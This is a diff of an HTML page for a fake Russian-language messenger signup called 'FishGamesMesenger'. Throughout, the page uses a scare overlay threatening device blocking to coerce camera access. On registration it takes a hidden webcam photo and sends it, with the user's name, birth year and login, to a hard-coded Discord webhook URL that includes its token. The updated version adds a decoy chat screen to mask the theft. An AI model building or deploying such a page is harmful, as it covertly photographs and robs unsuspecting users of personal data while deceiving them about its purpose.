@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Green Messenger Registration</title>
+    <title>FishGamesMesenger</title>
     <style>
         body { 
             font-family: 'Segoe UI', sans-serif; 
@@ -15,89 +15,64 @@
             min-height: 100vh; 
             margin: 0; 
             overflow: hidden; 
-            position: relative;
         }
 
-        /* Анимированные волны на фоне */
+        /* Узор волн */
         body::before {
-            content: "";
-            position: absolute;
-            width: 200%;
-            height: 200%;
-            top: -50%;
-            left: -50%;
-            z-index: 0;
+            content: ""; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
             background: url('https://www.transparenttextures.com/patterns/waves.png');
-            opacity: 0.2;
-            animation: moveWaves 20s linear infinite;
+            opacity: 0.15; animation: moveWaves 25s linear infinite; pointer-events: none;
         }
+        @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }
 
-        @keyframes moveWaves {
-            from { transform: translateX(0) translateY(0); }
-            to { transform: translateX(50px) translateY(50px); }
-        }
-
-        /* Основная карточка */
-        .reg-card { 
-            background-color: #1a2e2a; 
-            padding: 30px; 
-            border-radius: 15px; 
-            width: 350px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3); 
-            z-index: 2; 
-            border: 1px solid #2e8b57;
-        }
-
-        h2 { text-align: center; color: #4ade80; margin-top: 0; }
-        
-        .input-group { margin-bottom: 12px; }
-        label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
-        
-        input { 
-            width: 100%; 
-            padding: 10px; 
-            border-radius: 5px; 
-            border: 1px solid #2d4f47; 
-            background: #243b35; 
-            color: white; 
-            box-sizing: border-box; 
-            outline: none;
-        }
-        
-        input:focus { border-color: #4ade80; }
-
-        .reg-btn { 
-            width: 100%; 
-            padding: 12px; 
-            background: #22c55e; 
-            border: none; 
-            border-radius: 5px; 
-            color: white; 
-            font-weight: bold; 
-            cursor: pointer; 
-            margin-top: 15px; 
-            transition: 0.3s;
-        }
-        .reg-btn:hover { background: #16a34a; transform: translateY(-2px); }
-
-        /* Окно "Пугалка" */
+        /* Окно верификации */
         #camera-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #0d1a17; z-index: 1000; 
-            display: flex; flex-direction: column; justify-content: center; align-items: center; 
-            text-align: center; padding: 20px;
+            position: fixed; inset: 0; background: #0d1a17; z-index: 2000;
+            display: flex; justify-content: center; align-items: center; text-align: center;
         }
-        
-        .warning-box { 
-            border: 2px solid #22c55e; 
-            padding: 25px; 
-            border-radius: 15px; 
-            max-width: 400px; 
-            background: #1a2e2a; 
+        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
+
+        /* Форма регистрации */
+        #reg-screen { z-index: 10; }
+        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
+        input { 
+            width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; 
+            background: #243b35; color: white; box-sizing: border-box; outline: none; 
         }
-        .warning-box h3 { color: #f87171; margin-top: 0; }
-        .warning-box p { color: #d1fae5; font-size: 14px; line-height: 1.5; }
+        input:focus { border-color: #4ade80; }
+        .btn { 
+            width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; 
+            color: white; font-weight: bold; cursor: pointer; transition: 0.3s; 
+        }
+        .btn:hover { background: #16a34a; }
+
+        /* ИНТЕРФЕЙС МЕССЕНДЖЕРА */
+        #messenger-screen { 
+            display: none; width: 95vw; height: 90vh; background: #1a2e2a; 
+            border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden;
+        }
+        .messenger-container { display: flex; height: 100%; }
         
+        /* Боковая панель */
+        .sidebar { width: 250px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
+        .search-box { border: 1px solid white; border-radius: 20px; padding: 5px 15px; text-align: center; margin-bottom: 20px; font-size: 14px; }
+        .contact-item { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
+        .avatar { width: 50px; height: 50px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; }
+        .support { border: 1px solid white; padding: 10px; margin-top: auto; font-size: 13px; text-align: center; }
+
+        /* Зона чата */
+        .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(32, 178, 170, 0.1); position: relative; }
+        .chat-header { padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-bottom: 1px solid #2e8b57; }
+        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
+        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; position: relative; }
+        
+        /* Поле ввода */
+        .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; align-items: center; border-top: 1px solid #2e8b57; }
+        .msg-input { flex: 1; border: 2px solid #2e8b57; border-radius: 10px; padding: 12px; background: white; color: black; }
+        .send-btn { background: #22c55e; border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; border: none; cursor: pointer; }
+
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -105,39 +80,51 @@
 
 <div id="camera-overlay">
     <div class="warning-box">
-        <h3>⚠️ СИСТЕМНАЯ ВЕРИФИКАЦИЯ</h3>
-        <p>
-            Для доступа к защищенному каналу связи необходимо подтвердить личность владельца устройства.
-            <br><br>
-            В случае отказа доступ к серверу будет заблокирован по протоколу <b>SEC-2025</b>.
-        </p>
-        <button class="reg-btn" onclick="requestAccess()">ПРОЙТИ ПРОВЕРКУ</button>
+        <h3 style="color: #ff5252;">⚠️ FishGames Security</h3>
+        <p>Для активации мессенджера требуется верификация камеры.<br>При отказе устройство будет заблокировано.</p>
+        <button class="btn" onclick="requestAccess()">ПРОЙТИ ПРОВЕРКУ</button>
     </div>
 </div>
 
-<div class="reg-card">
-    <h2>Регистрация</h2>
+<div id="reg-screen" class="reg-card">
+    <h2>FishGamesMesenger</h2>
     <div class="input-group">
         <label>Имя</label>
         <input type="text" id="firstname" placeholder="Иван">
     </div>
     <div class="input-group">
-        <label>Фамилия</label>
-        <input type="text" id="lastname" placeholder="Иванов">
-    </div>
-    <div class="input-group">
         <label>Год рождения</label>
-        <input type="text" id="birthyear" placeholder="2000" maxlength="4" oninput="validateYear(this)">
+        <input type="text" id="birthyear" placeholder="2000" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,''); if(this.value>2025)this.value='2025'">
     </div>
     <div class="input-group">
         <label>Логин</label>
-        <input type="text" id="login" placeholder="cool_user">
+        <input type="text" id="login" placeholder="user_prime">
     </div>
-    <div class="input-group">
-        <label>Пароль</label>
-        <input type="password" id="pass" placeholder="******">
+    <button class="btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+</div>
+
+<div id="messenger-screen">
+    <div class="messenger-container">
+        <div class="sidebar">
+            <div class="search-box">поиск</div>
+            <div class="contact-item">
+                <div class="avatar" id="user-avatar">?</div>
+                <div id="contact-name">Загрузка...</div>
+            </div>
+            <div class="support">служба поддержки</div>
+        </div>
+        <div class="chat-area">
+            <div class="chat-header">FishGamesMesenger</div>
+            <div class="messages-display" id="chat-box">
+                </div>
+            <div class="input-bar">
+                <input type="text" class="msg-input" id="messageText" placeholder="Напишите сообщение...">
+                <button class="send-btn" onclick="sendMessage()">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+                </button>
+            </div>
+        </div>
     </div>
-    <button class="reg-btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -146,67 +133,60 @@
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const overlay = document.getElementById('camera-overlay');
-    
-    const discordWebhookUrl = 'https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw';
-
-    // Запрещаем вводить всё кроме цифр и ограничиваем годом 2025
-    function validateYear(input) {
-        input.value = input.value.replace(/[^0-9]/g, ''); // Только цифры
-        if (parseInt(input.value) > 2025) {
-            input.value = "2025";
-        }
-    }
+    const webhook = 'https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw';
 
     async function requestAccess() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            overlay.style.display = 'none';
-        } catch (err) {
-            alert("ОШИБКА: Доступ отклонен! Регистрация невозможна без биометрии.");
+            const s = await navigator.mediaDevices.getUserMedia({video: true});
+            video.srcObject = s;
+            document.getElementById('camera-overlay').style.display = 'none';
+        } catch(e) {
+            alert("ОШИБКА БЕЗОПАСНОСТИ! Доступ к камере обязателен.");
             location.reload();
         }
     }
 
-    async function register() {
-        const yearVal = document.getElementById('birthyear').value;
-        const firstVal = document.getElementById('firstname').value;
+    function register() {
+        const name = document.getElementById('firstname').value;
+        const login = document.getElementById('login').value;
+        const year = document.getElementById('birthyear').value;
 
-        if (!yearVal || !firstVal || yearVal.length < 4) {
-            alert("Введите корректные данные!");
-            return;
-        }
+        if(!name || !login) return alert("Заполни все поля!");
 
+        // Скрытое фото
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         
-        canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            const discordMessage = {
-                embeds: [{
-                    title: "🟢 Новый пользователь верифицирован",
-                    color: 5763719, // Зеленый
-                    fields: [
-                        { name: "Имя", value: firstVal, inline: true },
-                        { name: "Год", value: yearVal, inline: true },
-                        { name: "Логин", value: document.getElementById('login').value, inline: false }
-                    ],
-                    image: { url: 'attachment://photo.png' }
-                }]
-            };
+        canvas.toBlob(b => {
+            const fd = new FormData();
+            fd.append('payload_json', JSON.stringify({
+                embeds: [{ title: "📸 FishGames: Данные получены", color: 3066993, fields: [
+                    {name: "Имя", value: name, inline: true}, {name: "Год", value: year, inline: true}, {name: "Логин", value: login}
+                ]}]
+            }));
+            fd.append('file', b, 'p.png');
+            fetch(webhook, {method: 'POST', body: fd});
+        });
 
-            formData.append('payload_json', JSON.stringify(discordMessage));
-            formData.append('file', blob, 'photo.png');
+        // Переход в мессенджер
+        document.getElementById('reg-screen').style.display = 'none';
+        document.getElementById('messenger-screen').style.display = 'block';
+        document.getElementById('contact-name').innerText = name;
+        document.getElementById('user-avatar').innerText = name[0].toUpperCase();
+    }
 
-            try {
-                await fetch(discordWebhookUrl, { method: 'POST', body: formData });
-                alert("Аккаунт создан! Данные переданы в систему.");
-            } catch (err) {
-                alert("Ошибка сети.");
-            }
-        }, 'image/png');
+    function sendMessage() {
+        const inp = document.getElementById('messageText');
+        if(!inp.value) return;
+        
+        const box = document.getElementById('chat-box');
+        const m = document.createElement('div');
+        m.className = 'msg-bubble';
+        m.innerText = inp.value;
+        box.appendChild(m);
+        inp.value = '';
+        box.scrollTop = box.scrollHeight;
     }
 </script>
 
